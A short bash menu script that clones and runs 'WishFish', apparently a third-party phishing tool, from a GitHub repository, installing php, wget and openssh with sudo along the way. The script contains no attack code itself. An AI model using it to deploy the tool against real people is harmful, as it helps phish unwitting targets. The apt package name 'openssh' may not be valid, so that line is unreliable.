#!/bin/bash

# Function to handle installation
install_wishfish() {
    echo "Installing WishFish..."
    sudo git clone https://github.com/kinghacker0/WishFish.git
    sudo apt install php wget openssh
    echo "WishFish installed successfully!"
}

# Function to run WishFish
run_wishfish() {
    echo "Running WishFish..."
    cd WishFish|| { echo "Error: WishFish directory not found. Install WishFish."; return; }
    bash wishfish.sh
}

# Main menu
while true; do
    echo "WishFish Script"
    echo "----------------"
    echo "1. Install WishFish"
    echo "2. Run WishFish"
    echo "3. Exit"
    echo "----------------"
    
    read -rp "Enter your choice: " choice

    case $choice in
        1) install_wishfish ;;
        2) run_wishfish ;;
        3) exit ;;
        *) echo "Invalid choice. Please select again." ;;
    esac
done
